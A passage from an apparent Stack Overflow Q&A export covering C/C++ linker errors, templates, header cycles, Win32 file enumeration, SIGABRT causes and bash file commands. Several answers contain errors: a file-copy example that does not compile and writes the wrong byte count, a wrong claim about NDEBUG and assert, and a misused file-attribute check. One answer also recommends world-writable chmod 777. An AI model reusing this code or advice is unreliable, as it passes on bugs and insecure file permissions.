Get_Data(Handle);
</code></pre>

<p>This method is confusing to me because I don't specify the DLL I want to import from.  I have copied the DLL to the project folder and I have added it to the project manually, so hopefully that means it can be found.  When I compile the linker returns the following errors:</p>

<p><b>
error LNK2028: unresolved token (0A00034F) ""wchar_t * __cdecl Get_Data(wchar_t *)"" (?Get_Data@@$$FYAPA_WPA_W@Z) referenced in function ""int __cdecl main(void)"" (?main@@$$HYAHXZ)</p>

<p>error LNK2019: unresolved external symbol ""wchar_t * __cdecl Get_Data(wchar_t *)"" (?Get_Data@@$$FYAPA_WPA_W@Z) referenced in function ""int __cdecl main(void)"" (?main@@$$HYAHXZ)
</b></p>

<p>I suspected maybe this meant I should be using wchar_t or wchar_t* instead of BSTR, but changing to either datatype results in the same error.</p>

<p><strong>Method 3)</strong> GetProcAddress</p>

<pre><code>typedef BSTR (*Get_Data_Ptr)(BSTR Handle);  
HINSTANCE LoadMe;
LoadMe = LoadLibraryA(""Sensor DLL.dll"");

if (!LoadMe)
    std::cout &lt;&lt; ""\nDLL failed to load!\n"";

Get_Data_Ptr LibMainGet_Data;  
LibMainGet_Data = (Get_Data_Ptr)GetProcAddress(LoadMe,""Get_Data"");

//then I call the function
LibMainGet_Data(Handle);
</code></pre>

<p>This will compile, but gives the following error when run:</p>

<p><b>
An unhandled exception of type 'System.AccessViolationException' occurred</p>

<p>Additional information: Attempted to read or write protected memory. This is often an indication that other memory is corrupt.
</b></p>

<p>When I mouse over the various parts of this code in debug mode it seems that, like the first method, it was also unable to find the 'Get_Data' entry point in the DLL.</p>

<p>Has anyone called functions from a VB DLL using C++ when you haven't made the DLL yourself and you don't have .idl files, etc?  Does anyone have a working example like this you could share?<br>
Thanks!  </p>
","9530","","<p>It sounds like the DLL isn't actually exporting a function named <code>Get_Data</code>.  Open up a command prompt and use <a href=""http://msdn.microsoft.com/en-us/library/c1h23y6c%28VS.71%29.aspx"" rel=""nofollow"">dumpbin</a> to get the list of exports of the DLL, e.g.:</p>

<pre><code>dumpbin /exports ""Sensor DLL.dll""
</code></pre>

<p>(dumpbin.exe is located in VC\bin within your Visual Studio install folder, which istypically something like <code>C:\Program Files\Microsoft Visual Studio 10.0</code>).</p>

<p>Then, replace <code>Get_Data</code> with the actual entry point and see if you have any better luck.</p>
"
"<p>I am extending an existing C++ project.  I have a base class that derives from two parent classes.  One of the parents has a pure virtual function.  I want that pure virtual function to be defined by a function implemented in the other parent.</p>

<p>So, I want another parent to satisfy the base class's obligation to define a parent's pure virtual function.  I have tried two approaches, both have lead to compiler errors.<br>
<strong>Any ideas?</strong></p>

<p>Here is a C++ program demonstrating my first idea, hoping the compiler would just use <code>base2</code>'s definition of <code>vfunc()</code>.</p>

<pre><code>// This is my first approach, hoping the parent base2 of derived would satisfy the need to define
// base1's pure virtual vfunc.

class base1 {
public:
 virtual int vfunc() = 0;
};

class base2 {
public:
 int vfunc() { return 0;} //defined
};

class derived : public base1, public base2 {
public:
 //empty
};

int main()
{
 derived d;
 base1 &amp; b1 = d;
 int result = b1.vfunc();
 return result;
}
</code></pre>

<p>The compiler reports that <code>derived</code> is still an abstract class:</p>

<pre><code>$ gcc a.cc 
a.cc: In function ‘int main()’:
a.cc:26: error: cannot declare variable ‘d’ to be of abstract type ‘derived’
a.cc:18: note:   because the following virtual functions are pure within ‘derived’:
a.cc:7: note:  virtual int base1::vfunc()
</code></pre>

<p>Here is my second attempt:</p>

<pre><code>// This is my second attempt, defining a vfunc in the derived class that calls the other parent.

class base1 {
public:
 virtual int vfunc() = 0;
};

class base2 {
public:
 int vfunc() { return 0; } // defined
};

class derived : public base1, public base2 {
public:
 int vfunc() { return base2::vfunc(); } // call the other parent's vfunc
};

int main()
{
 derived d;
 base1 &amp; b1 = d;
 int result = b1.vfunc();
 return result;
} 
</code></pre>

<p>I actually expected this to do it for me, but instead the linker is giving me a bunch of vtable errors that I do not understand:  ( Mac OS 10.6, gcc 4.2.1 )</p>

<pre><code>$ gcc inheritance_tester.cc 
Undefined symbols:
  ""vtable for __cxxabiv1::__vmi_class_type_info"", referenced from:
      typeinfo for derivedin ccmeHq8C.o
  ""___cxa_pure_virtual"", referenced from:
      vtable for base1in ccmeHq8C.o
  ""___gxx_personality_v0"", referenced from:
      _main in ccmeHq8C.o
      base2::vfunc()     in ccmeHq8C.o
      derived::vfunc()     in ccmeHq8C.o
      base1::base1() in ccmeHq8C.o
      base2::base2() in ccmeHq8C.o
      derived::derived()in ccmeHq8C.o
      CIE in ccmeHq8C.o
  ""vtable for __cxxabiv1::__class_type_info"", referenced from:
      typeinfo for base1in ccmeHq8C.o
      typeinfo for base2in ccmeHq8C.o
ld: symbol(s) not found
</code></pre>
","9530","","<p>Your second piece of code is fine, you're just not compiling it correctly.  You need to compile with g++, not gcc.  When you compile with g++, it automatically links in the C++ runtime libraries; when you compile with gcc, it does not.  You can also manually add them yourself:</p>

<pre><code># Option 1: compile with g++
g++ inheritance_tester.cc

# Option 2: compile with gcc and link with the C++ standard libraries
gcc inheritancet_test.cc -lstdc++
</code></pre>
"
"<p>Is it possible to write an obj-C code with any text editor and then upload it to Mac server to compile it using Xcode??
I know that it is possible to compile your project using Xcode without open it something like use some command lines, but I am not sure is it possible to make it a server and then upload any obj-c code!</p>
","9530","","<p>You can compile your projects from the command line using the <a href=""http://www.manpagez.com/man/1/xcodebuild/"" rel=""nofollow""><code>xcodebuild</code></a> command.  Automating your builds is another story altogether: you'll need to set up your server to download the updated source code (typically via version control, e.g. <code>svn update</code> or <code>p4 sync</code>), do the build, and then upload the builds results somehwere (e.g. check into version control).</p>

<p>Doing this is non-trivial, and there's a lot of software out there, such as <a href=""http://www.finalbuilder.com/home.aspx"" rel=""nofollow"">FinalBuilder</a>, to help make this easier, although FinalBuilder is Windows software so probably isn't what you want.</p>
"
"<p>I have an existing application in C++ with a custom <code>ArrayBase</code> class that manages storage and access to a contiguously allocated region of memory.  I have a separate <code>ItrBase</code> class that is used to access data in that <code>ArrayBase</code>.  <code>ArrayBase</code> has a <code>createItr()</code> function that currently returns an <code>ItrBase</code> object.</p>

<p>I need to extend <code>ArrayBase</code> to use multiple memory allocations instead of one contiguous one.  I have created an <code>EnhancedArray</code> class to do that.  For this <code>EnhancedArray</code> to be compatible with the existing application, it's <code>createItr()</code> function must return something that works with the new multiple memory allocations.</p>

<p>So, I have created a derived <code>EnhanceItr</code> class to do this.
My problem is I can't figure out a way for hundreds of code occurrences like this:</p>

<pre><code>ItrBase anIterator = anArray.createItr();
...
double x = anIterator.getData();
</code></pre>

<p>to use the <code>EhancedItr</code>'s <code>getData()</code> function when <code>anArray</code> is an <code>EnhancedArray</code>.</p>

<p>Here is a simple application illustrating my basic arrangement.</p>

<pre><code>#include &lt;iostream&gt;
using namespace std;

class ItrBase {
public:
 ItrBase() { cout &lt;&lt; ""ItrBase constructor.\n""; };
 ~ItrBase() { cout &lt;&lt; ""ItrBase destructor.\n""; };
 virtual int vfunc() {return 1;};
};


class EnhancedItr : public ItrBase {
public:
 EnhancedItr() { cout &lt;&lt; ""EnhancedItr constructor.\n""; };
 ~EnhancedItr() { cout &lt;&lt; ""EnhancedItr destructor.\n""; };
 int vfunc() {return 0;};
};


class ArrayBase {
public:
 ArrayBase() { cout &lt;&lt; ""ArrayBase constructor.\n""; };
 ~ArrayBase() { cout &lt;&lt; ""ArrayBase destructor.\n""; };
 virtual ItrBase &amp; createItr() {cout &lt;&lt; ""in AB's createItr()\n""; return *new ItrBase(); };
};


class EnhancedArray : public ArrayBase {
public:
 EnhancedArray() { cout &lt;&lt; ""EnhancedArray constructor.\n""; };
 ~EnhancedArray() { cout &lt;&lt; ""EnhancedArray destructor.\n""; };
 EnhancedItr &amp; createItr() {cout &lt;&lt; ""in EA's createItr()\n""; return *new EnhancedItr(); };
};


int main()
{
 ArrayBase ab;
 EnhancedArray ea;

 ItrBase itr = ab.createItr();  
 ItrBase eitr = ea.createItr();  //EnhancedItr assigned to ItrBase

 cout &lt;&lt; ""ArrayBase's Itr .vfunc(): "" &lt;&lt; itr.vfunc() &lt;&lt;std::endl;
 cout &lt;&lt; ""EnhancedArray's Itr .vfunc(): "" &lt;&lt; eitr.vfunc() &lt;&lt;std::endl;
 return 0;
}
</code></pre>

<p>Both calls to <code>vfunc()</code> above return 1, when I want the second call to return 0.</p>

<p>In <code>main()</code>, I know that if I change the <code>ItrBase</code> types to <code>ItrBase &amp;</code>'s, I do get the desired return types, but then I am modifying my 'existing' code in hundreds of areas, and the destructors for the Iterators are not called.</p>

<p>Is there another strategy that I am not seeing?</p>

<p>Thanks.</p>
","9530","","<p>You're running into a problem called <a href=""http://stackoverflow.com/questions/274626/what-is-the-slicing-problem-in-c""><em>slicing</em></a>: <code>createItr</code> returns a reference, and then you're copying that into an <code>ItrBase</code> <em>by-value</em>.  It's as if you did something like this:</p>

<pre><code>EnhancedItr itr1 = ...;
BaseItr itr2 = itr1;  // copy by-value
cout &lt;&lt; itr2.vfunc();  // prints 1, not 0
</code></pre>

<p>You're also leaking memory: <code>createItr</code> returns a newly allocated object, but you're never deleting it.  This is very bad, especially since you'd expect array iterators to be used frequently.</p>
"
"<p>I have got a file that look like:</p>

<pre><code>&lt;a href=""some-adress""&gt;some-txt&lt;/a&gt;
&lt;a href=""some-adress""&gt;some-txt&lt;/a&gt;
&lt;a href=""some-adress""&gt;some-txt&lt;/a&gt;
...
</code></pre>

<p>I need to download all files that are as ""some-adress"", how can I do that using only bash?</p>
","9530","","<p>Here's one way to do that using a combination of <code>sed</code>, <code>xargs</code>, and <code>wget</code>:</p>

<pre><code>sed -n 's/.*&lt;a href=""\([^""]*\)""&gt;.*/\1/p' input-file | xargs wget
</code></pre>
"
"<p>In specific directory i need to find all files with some specific extension (for example .log)
and than save it somewhere. In need only c++ solutions cause i'm trying it on win 2003 server and c++ is my restrictions. Thank you very munch</p>
","9530","","<p>You can enumerate all of the files in a directory using <a href=""http://msdn.microsoft.com/en-us/library/aa364418%28VS.85%29.aspx"" rel=""nofollow""><code>FindFirstFile</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/aa364428%28v=VS.85%29.aspx"" rel=""nofollow""><code>FindNextFile</code></a> (and don't forget to call <a href=""http://msdn.microsoft.com/en-us/library/aa364413%28v=VS.85%29.aspx"" rel=""nofollow""><code>FindClose</code></a> when you're done).  You can pass in a filter to these functions to only look for certain filenames, e.g. <code>directory\*.log</code>.</p>

<p>As you enumerate the files, the <a href=""http://msdn.microsoft.com/en-us/library/aa365740%28v=VS.85%29.aspx"" rel=""nofollow""><code>WIN32_FIND_DATA</code></a> structure that gets returned tells you the filename and attributes of each file (among other things).  For each file, check the file attributes to make sure it's a regular file by checking that it has the <code>FILE_ATTRIBUTE_NORMAL</code> flag so that you ignore directories.</p>

<p>For example:</p>

<pre><code>WIN32_FIND_DATA fileInfo;
HANDLE hFind = FindFirstFile(""C:\\directory\\to\\search\\*.log"", &amp;fileInfo);
if(hFind == INVALID_HANDLE_VALUE)
    ;  // handle error
else
{
    do
    {
        if(fileInfo.dwFileAttributes &amp; FILE_ATTRIBUTE_NORMAL)
        {
            printf(""Found a .log file: %s\n"", fileInfo.cFileName);
        }
    } while(FindNextFile(hFind, &amp;fileInfo));
    if(GetLastError() != ERROR_NO_MORE_FILES)
        ;  // handle error
    FindClose(hFind);
}
</code></pre>
"
"<p>The <a href=""http://c-faq.com/~scs/cclass/notes/sx7c.html"" rel=""nofollow"">C-faq</a> says that the code:</p>

<pre><code>int i = 7;
printf(""%d\n"", i++ * i++);
</code></pre>

<p>prints 49. Regardless of the order of evaluation, shouldn't it print 56? 
When I ran this code on my Turbo C 3.0 compiler it gave me the output of 56. Why is there a contradiction?</p>
","9530","","<p>Because it's <strong>undefined behavior</strong>.  The compiler can do whatever it wants: it can make the code print 56, 49, or ""your mom"", and the compiler would still be standards-conforming.</p>

<p>You can't modify the same value more than once between two sequence points.</p>
"
"<p>I need to find ALL files that have multiple keywords anywhere in the file (not necessarily on the same line), given a starting directory like ~/. Does ""grep -ro"" do this?</p>

<p>(I'm using Unix, Mac OSX 10.4)</p>
","9530","","<p>You can use the <code>-l</code> option to get a list of filenames with matches, so it's just a matter of finding all of the files that have the first keyword and then filtering that list down to the files that also have the second keyword:</p>

<pre><code>grep -rl first_keyword basedir | xargs grep -l second_keyword
</code></pre>
"
"<p>I'm receiving the forbids declaration without type error in a Qt application I'm working on.  The problem is that I have included the header file which declares the class.  It should be defined as a type as far as I can tell.  I tried forward declaration as well, but I'd like to use the methods of the class in this file and so I need the whole header file.
code:</p>

<p>Shapes.h</p>

<pre><code>#ifndef SHAPES_H
#define SHAPES_H

#include ""Colors.h""
#include &lt;QPoint&gt;
#include ""glwidget.h""

//class GLWidget;  

class Shape
{
    public:

        virtual void draw();
};

class Rectangle : public Shape
{
    public:
        Rectangle(GLWidget *w, QPoint tl, QPoint br);

        virtual void draw(){
              // top horizontal
            for(int i = topLeft.x(); i &lt; btmRight.x(); i++){
                 glWidget-&gt;setPixel(i,topLeft.y(), color);
             }
        }

    private:
        QPoint topLeft,btmRight;
        GLWidget *glWidget;        /****  This is the Error line  ****/
        RGBColor color;
};

#endif // SHAPES_H
</code></pre>

<p>glwidget.h:</p>

<pre><code>#ifndef AGLWIDGET_H
#define AGLWIDGET_H

#include &lt;QGLWidget&gt;

#include ""Colors.h""
#include ""Shapes.h""

class GLWidget : public QGLWidget
{
    Q_OBJECT

public:
    GLWidget(QWidget *parent = 0);
    ~GLWidget();

    QSize minimumSizeHint() const;
    QSize sizeHint() const;

    void setPixel(int x, int y, RGBColor c);

public slots:
    void setColor(RGBColor c);
    void setDrawRectangle();



protected:
    void initializeGL();
    void paintGL();
    void resizeGL(int width, int height);
    void mousePressEvent(QMouseEvent *event);
    void mouseMoveEvent(QMouseEvent *event);

private:

    QPoint lastPos;
    QVector&lt;QPoint&gt; drawPoints;
    RGBColor paintColor;
    int drawmode;
    Shape *currentShape;

};


#endif
</code></pre>

<p>I don't see why I can't use my GLWidget in Shapes.h.  The error is in Shapes.h on the line where I declare GLWidget *glWidget;
If I use a forward declaration ie. class GLWidget; this error goes away but then I can't actually use the GLWidget methods as in Rectangle.draw()</p>

<p>Anyone have an idea why the compiler wouldn't see GLWidget as a type in Shapes.h?</p>

<p>Exact errors:</p>

<p>Shapes.h:20: error: expected ')' before '*' token<br>
Shapes.h:31: error: ISO C++ forbids declaration of 'GLWidget' with no type<br>
Shapes.h:31: error: expected ';' before '*' token<br>
Shapes.h: In member function 'virtual void Rectangle::draw()':<br>
Shapes.h:25: error: 'glWidget' undeclared (first use this function)<br>
Shapes.h:25: error: (Each undeclared identifier is reported only once for each function it appears in.)</p>
","9530","","<p>You have a circular dependency between your header files -- Shapes.h includes glwidget.h, which includes Shapes.h again.  So, the second time the compiler tries to include glwidget.h, the include guard <code>AGLWIDGET_H</code> <em>has</em> been defined, so it doesn't include it again, and then the code in Shapes.h tries to use types that ought to have been declared but are not.</p>

<p>To fix it, you need to remove one of the dependencies and use forward declarations instead.  Since glwidget.h doesn't actually use the <code>Shape</code> class beyond declaring a pointer member variable, you should remove its inclusion of Shapes.h:</p>

<p>glwidget.h:</p>

<pre><code>#ifndef AGLWIDGET_H
#define AGLWIDGET_H

// do NOT include Shapes.h

class Shape;  // forward declaration

class GLWidget : public QGLWidget
{
    ...
    Shape *currentShape;
};

#endif
</code></pre>

<p>Shapes.h is the same as before:</p>

<pre><code>#ifndef SHAPES_H
#define SHAPES_H

#include ""glwidget.h""
...
#endif
</code></pre>
"
"<p>Is there a formula to convert a quaternion to an angle?</p>

<p>Looking to do something on the iPhone using the Core Motion API and the gyro so that based on data I receive from it (in the form of quaternions) I can project a UIView on the screen.</p>

<p>Thanks</p>
","9530","","<p>Yes, see <a href=""http://en.wikipedia.org/wiki/Quaternions_and_spatial_rotation"" rel=""nofollow"">Quaternions and spatial rotation</a>.  The unit quaternion (w, x, y, z) represents a rotation about the axis (x, y, z) of an angle of 2*cos<sup>-1</sup>(w).</p>

<p>Note that this is only true of <em>unit</em> quaternions.  Non-unit quaternions do not represent rotations.</p>
"
"<p>In Linux we can use the following command to change permission mode of the files and folders recursively.</p>

<blockquote>
  <p>find ""/Users/Test/Desktop/PATH"" -exec
  * chmod 777 {} \;</p>
</blockquote>

<p>how could i do the same for mac as i m getting the following error repeatatively.</p>

<blockquote>
  <p>find: TEST_FILE: No such file or
  directory</p>
</blockquote>
","9530","","<p>The issue is that the <code>*</code> is getting interpreted by your shell and is expanding to a file named <code>TEST_FILE</code> that happens to be in your current working directory, so you're telling <code>find</code> to execute the command named <code>TEST_FILE</code> which doesn't exist.  I'm not sure what you're trying to accomplish with that <code>*</code>, you should just remove it.</p>

<p>Furthermore, you should use the idiom <code>-exec program '{}' \+</code> instead of <code>-exec program '{}' \;</code> so that <code>find</code> doesn't fork a new process for each file.  With <code>;</code>, a new process is forked for each file, whereas with <code>+</code>, it only forks one process and passes all of the files on a single command line, which for simple programs like <code>chmod</code> is much more efficient.</p>

<p>Lastly, <code>chmod</code> can do recursive changes on its own with the <code>-R</code> flag, so unless you need to search for specific files, just do this:</p>

<pre><code>chmod -R 777 /Users/Test/Desktop/PATH
</code></pre>
"
"<p>I am working on a web browser with c++ using IWebBrowser2. Declared on the top, outside any scope, I have this:</p>

<pre><code>static char buf[1024];
</code></pre>

<p>In the documentcomplete event, I set the BSTR with:</p>

<pre><code>CComBSTR bstrHTMLText;
X-&gt;get_outerHTML(&amp;bstrHTMLText);
</code></pre>

<p>What I want to do is to copy bstrHTMLText value into buf (if bstrHTMLText length is > 1024 just fill buf and ignore the rest). every time documentcomplete fires.</p>

<p>How can I do this?</p>
","9530","","<p>A <code>BSTR</code> is secretly a pointer to a Unicode string, with a hidden length prefix sitting in front of the string data.  So, you can just cast it to <code>wchar_t*</code> and then convert that wide-character string to an ANSI string, e.g. using <a href=""http://msdn.microsoft.com/en-us/library/dd374130%28VS.85%29.aspx"" rel=""nofollow""><code>WideCharToMultiByte</code></a>:</p>

<pre><code>WideCharToMultiByte(CP_UTF8,
                    0, 
                    bstrHTMLText.m_str,
                    SysStringLen(bstrHTMLText.m_str),
                    buf,
                    sizeof(buf),
                    NULL,
                    NULL);
</code></pre>
"
"<p>The possible values are...</p>

<pre><code>1 (it will always start with a number)
1,2
4,6,10
</code></pre>
","9530","","<p>This will do:</p>

<pre><code>-?[0-9]+(,-?[0-9]+)*
</code></pre>

<p>Or, if you want to be pedantic and disallow numbers starting with 0 (other than 0 itself):</p>

<pre><code>(0|-?[1-9][0-9]*)(,(0|-?[1-9][0-9]*))+
</code></pre>

<p>Floating-point numbers are left as an exercise to the reader.</p>
"
"<p>For a sequence of values, how would one find the sorted middle 50% of the sequence in Boost Accumulators?</p>

<p>For example, let's say that I have the following sequence,<br>
<strong>25, 21, 9, 13, 17, 19, 12, 29, 50, 97, 10, 11</strong>.</p>

<p>The middle 50% data I would like to have is as follows:<br>
<strong>13, 17, 19, 21</strong>.</p>

<p>Of course, one can sort the sequence, which now becomes<br>
<strong>9, 10, 11, 12, 13, 17, 19, 21, 25, 29, 50, 97</strong>.</p>

<p>And then one can collect the middle 50% data.</p>

<p>Now, does the Accumulators framework internally store and sort the sequence? If yes, is it possible to retrieve the value that reside in a particular index?</p>

<p>Reading from <a href=""http://boost.2283326.n4.nabble.com/Boost-accumulators-weighted-median-td2587765.html"" rel=""nofollow"">here</a>, I think the Accumulators framework does not store the original data and this framework is not appropriate for the problem I am trying to solve.</p>

<p>While writing this, I find it a bit foolish to try to accomplish this using Accumulators. However, I was using it for other purposes and I was expecting a solution in Accumulators. </p>

<p>Now, is it possible to build a data structure that efficiently maintain a current and sorted middle 50% data in a way that the size of the data structure almost never exceeds the half of the size of the sequence?</p>

<p>Thinking about it for a while, I guess it may not be possible to devise such a data structure. At the first thought, I thought that some of the values can be forgotten/discarded permanently assuming they will never appear in the sorted middle 50%. However, this assumption is probably wrong, and some values might reappear in the sorted middle 50% depending on the <strong>yet to arrive</strong> values in the sequence.</p>
","9530","","<p>You're looking for a <a href=""http://en.wikipedia.org/wiki/Selection_algorithm"" rel=""nofollow"">selection algorithm</a>.</p>

<p>Using a selection algorithm, you can find the 25th and 75th percentile elements of your data set in linear time.  Then, you just loop through your array and pick out all of the elements that are between the 25th and 75th percentiles to get the middle 50% you're looking for.</p>
"
"<p>I working in iPhone application, i am picking an image from photo library using UIImage picker control, then processing it and displays the image and the corresponding output using UIImageview and UITextview respectively. For some images it working fine and for some of images program crashed and while checking this with break point i am getting message like PROGRAM RECEIVED SIGNAL SIGABRT. can any one suggest me how to handle this error.
Note: For every image i am getting output, i checked it with breakpoint.
my sample code is here,</p>

<p>To display image:</p>

<pre><code> CGRect myImageRect = CGRectMake(0.0f, 0.0f, 320.0f, 240.0f);
 UIImageView *myImage = [[UIImageView alloc] initWithFrame:myImageRect];
 [myImage setImage:img];
 myImage.opaque = YES; // explicitly opaque for performance
 [self.view addSubview:myImage];
 [myImage release];
</code></pre>

<p>To display text:</p>

<pre><code> CGRect frame = CGRectMake(0.0f, 250.0f, 320.0f,25.0f);
 UITextView * tmpTextView = [[UITextView alloc]initWithFrame:frame];
 tmpTextView.text = [NSString stringWithFormat:@""%@%@"",@""value: "", somevalue];
 [self.view addSubview:tmpTextView];
 [tmpTextView release];
</code></pre>
","9530","","<p><code>SIGABRT</code> is raised by the <a href=""http://linux.die.net/man/3/abort""><code>abort(3)</code></a> function.  It's impossible to tell exactly what's going on in your program without more information, but the most common reasons that <code>abort()</code> gets called are:</p>

<ul>
<li>Your sending a message to an Objective-C object that doesn't support/implement that message.  This results in the dreaded <a href=""https://www.google.com/search?q=unrecognized+selector+sent+to+instance+site%3Astackoverflow.com"">""unrecognized selector sent to instance""</a> error.</li>
<li>You have a failed assertion somewhere.  In non-debug builds that define the macro <code>NDEBUG</code>, the standard library macro <a href=""http://linux.die.net/man/3/assert""><code>assert(3)</code></a> calls <code>abort()</code> when the assertion fails</li>
<li>You have some memory stomping/allocation error.  When <code>malloc</code>/<code>free</code> detect a corrupted heap, the may call <code>abort()</code> (see, e.g. <a href=""http://stackoverflow.com/questions/3171194/getting-program-received-signalsigabrt-in-iphone-sdk"">this question</a>)</li>
<li>You're throwing an uncaught exception (either a C++ exception or an Objective-C exception)</li>
</ul>

<p>In almost all cases, the debug console will give you a little more information about what's causing <code>abort()</code> to be called, so always take a look there.</p>
"
"<p>I'm writing an SDL application for Linux, that works from the console (no X server). One function I have is a file copy mechanism, that copies specific files from HDD to USB Flash device, and showing progress of this copy in the UI. To do this, I'm using simple while loop and copying file by 8kB chunks to get copy progress. The problem is, that it's slow. I get to copy a 100 MB file in nearly 10 minutes, which is unacceptable.</p>

<p>How can I implement faster file copy? I was thinking about some asynchronous API that would read file from HDD to a buffer and store the data to USB in separate thread, but I don't know if I should implement this myself, because it doesn't look like an easy task. Maybe you know some C++ API/library that can that for me? Or maybe some other, better method?</p>
","9530","","<p>Don't synchronously update your UI with the copy progress, that will slow things down considerably.  You should run the file copy on a separate thread from the main UI thread so that the file copy can proceed as fast as possible without impeding the responsiveness of your application.  Then, the UI can update itself at the natural rate (e.g. at the refresh rate of your monitor).</p>

<p>You should also use a larger buffer size than 8 KB.  Experiment around, but I think you'll get faster results with larger buffer sizes (e.g. in the 64-128 KB range).</p>

<p>So, it might look something like this:</p>

<pre><code>#define BUFSIZE (64*1024)

volatile off_t progress, max_progress;

void *thread_proc(void *arg)
{
    // Error checking omitted for expository purposes
    char buffer[BUFSIZE];
    int in = open(""source_file"", O_RDONLY);
    int out = open(""destination_file"", O_WRONLY | O_CREAT | O_TRUNC);

    // Get the input file size
    struct stat st;
    fstat(in, &amp;st);

    progress = 0;
    max_progress = st.st_size;

    ssize_t bytes_read;
    while((bytes_read = read(in, buffer, BUFSIZE)) &gt; 0)
    {
        write(out, buffer, BUFSIZE
        progress += bytes_read;
    }

    // copy is done, or an error occurred
    close(in);
    close(out);

    return 0;
}

void start_file_copy()
{
    pthread_t t;
    pthread_create(&amp;t, NULL, &amp;thread_proc, 0);
}

// In your UI thread's repaint handler, use the values of progress and
// max_progress
</code></pre>

<p>Note that if you are sending a file to a <em>socket</em> instead of another file, you should instead use the <a href=""http://linux.die.net/man/2/sendfile"" rel=""nofollow""><code>sendfile(2)</code></a> system call, which copies the file directly in kernel space without round tripping into user space.  Of course, if you do that, you can't get any progress information, so that may not always be ideal.</p>

<p>For Windows systems, you should use <a href=""http://msdn.microsoft.com/en-us/library/aa363852%28v=VS.85%29.aspx"" rel=""nofollow""><code>CopyFileEx</code></a>, which is both efficient and provides you a progress callback routine.</p>
"
"<p>I'm getting the following linker errors:</p>

<pre><code>Error   1   error LNK2001: unresolved external symbol ""public: __thiscall AguiEvent&lt;class AguiEmptyEventArgs&gt;::AguiEvent&lt;class AguiEmptyEventArgs&gt;(void)"" (??0?$AguiEvent@VAguiEmptyEventArgs@@@@QAE@XZ)    AguiWidgetBase.obj
Error   2   error LNK2001: unresolved external symbol ""public: void __thiscall AguiEvent&lt;class AguiEmptyEventArgs&gt;::call(class AguiEmptyEventArgs)"" (?call@?$AguiEvent@VAguiEmptyEventArgs@@@@QAEXVAguiEmptyEventArgs@@@Z)  AguiWidgetBase.obj
Error   3   error LNK2001: unresolved external symbol ""public: __thiscall AguiEvent&lt;class AguiControlEventArgs&gt;::AguiEvent&lt;class AguiControlEventArgs&gt;(void)"" (??0?$AguiEvent@VAguiControlEventArgs@@@@QAE@XZ)  AguiWidgetBase.obj
Error   4   error LNK2001: unresolved external symbol ""public: void __thiscall AguiEvent&lt;class AguiControlEventArgs&gt;::call(class AguiControlEventArgs)"" (?call@?$AguiEvent@VAguiControlEventArgs@@@@QAEXVAguiControlEventArgs@@@Z)  AguiWidgetBase.obj
Error   5   fatal error LNK1120: 4 unresolved externals C:\Users\Josh\Documents\Visual Studio 2008\Projects\Agui\STATIC Release\Agui.exe
</code></pre>

<p>I have AguiEventArgs.h which has this:</p>

<pre><code>class AguiWidgetBase;

class AguiEmptyEventArgs {
public:
    AguiEmptyEventArgs();
};

class AguiMouseEventArgs {
    AguiPoint position;
    int mouseWheelChange;
    AguiMouseButtonEnum button;
public:
    AguiPoint getPosition() const;
    int getMouseWheelChange() const;
    AguiMouseButtonEnum getButton() const;
    int getX() const;
    int getY() const;
    AguiMouseEventArgs();
    AguiMouseEventArgs(const AguiPoint &amp;position,
        int mouseWheelChange, AguiMouseButtonEnum button);
};

class AguiKeyEventArgs {
    AguiKeyEnum key;
    AguiKeyModifierEnum modKey;
    bool isAlt;
    bool isControl;
    bool isShift;
public:
    bool getAlt() const;
    bool getControl() const;
    bool getShift() const;
    AguiKeyEnum getKey() const;
    AguiKeyModifierEnum getModifierKeyFlags() const;
    AguiKeyEventArgs();
    AguiKeyEventArgs(AguiKeyEnum key, AguiKeyModifierEnum modKey);
};

class AguiControlEventArgs {
    AguiWidgetBase* control;
public:
    AguiWidgetBase* getControl() const;
    AguiControlEventArgs();
    AguiControlEventArgs(AguiWidgetBase* control);
};
</code></pre>

<p>I have double checked and defined all of these.</p>

<p>My Agui event is here:</p>

<pre><code>template &lt;typename T&gt;
class AguiEvent {
void (*onEvent)(T arg);
public:
void setHandler(void (*eventProc)(T arg));
void removeHandler();
void call(T arg);
AguiEvent();
};
</code></pre>

<p>its defined:</p>

<pre><code>template &lt;typename T&gt;
void AguiEvent&lt;T&gt;::setHandler( void (*eventProc)(T arg) )
{
    onEvent = eventProc;
}


template &lt;typename T&gt;
void AguiEvent&lt;T&gt;::removeHandler()
{
    onEvent = 0;
}


template &lt;typename T&gt;
void AguiEvent&lt;T&gt;::call(T arg)
{
    if(onEvent)
        onEvent(arg);
}

template &lt;typename T&gt;
AguiEvent&lt;T&gt;::AguiEvent()
{
    onEvent = 0;
}
</code></pre>

<p>it is used like this:</p>

<pre><code> AguiEvent&lt;AguiEmptyEventArgs&gt; eventThemeChanged;
    AguiEvent&lt;AguiControlEventArgs&gt; eventChildControlAdded;
    AguiEvent&lt;AguiControlEventArgs&gt; eventChildControlRemoved;
</code></pre>

<p>ex:</p>

<pre><code>void AguiWidgetBase::addChildControl( AguiWidgetBase *control )
{
    onAddChildControl(control);
    eventChildControlAdded.call(AguiControlEventArgs(control));

}
</code></pre>

<p>Thanks</p>
","9530","","<p>You need to define templated class functions in your header file, you cannot put them in a separate .cpp file (don't even think about using the poorly supported <code>export</code> keyword to do that).</p>

<p>The reason for this is because the compiler needs the source code for the template every time it's instantiated: it has to generate separate code for each template instantiation.  The linker is smart enough to make sure that only one copy of each instantiation gets used in the final executable, even if the same template gets instantiated multiple times across different translation units.</p>
"
"<p>I'm looking for a table (or a way to generate one) for every character in each of the following C Character Sets:</p>

<ul>
<li>Basic Character Set</li>
<li>Basic Execution Character Set</li>
<li>Basic Source Character Set</li>
<li>Execution Character Set</li>
<li>Extended Character Set</li>
<li>Source Character Set</li>
</ul>

<p>C99 mentions all six of these under <em>section 5.2.1</em>. However, I've found it extremely cryptic to read and lacking in detail.</p>

<p>The only character sets that it clearly defines is the <strong>Basic Execution Character Set</strong> and the <strong>Basic Source Character Set</strong>:</p>

<blockquote>
  <p><strong>52 upper- and lower-case letters in
  the Latin alphabet:</strong></p>
  
  <p>A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p>
  
  <p>a b c d e f g h i j k l m n o p q r s t u v w x y z</p>
  
  <p><strong>Ten decimal digits:</strong></p>
  
  <p>0 1 2 3 4 5 6 7 8 9</p>
  
  <p><strong>29 graphic characters:</strong></p>
  
  <p>! "" # % &amp; ' ( ) * + , – . / : ; &lt; = > ? [ \ ] ^ _ { | } ~</p>
  
  <p><strong>4 whitespace characters:</strong></p>
  
  <p>space, horizontal tab, vertical tab, form feed</p>
</blockquote>

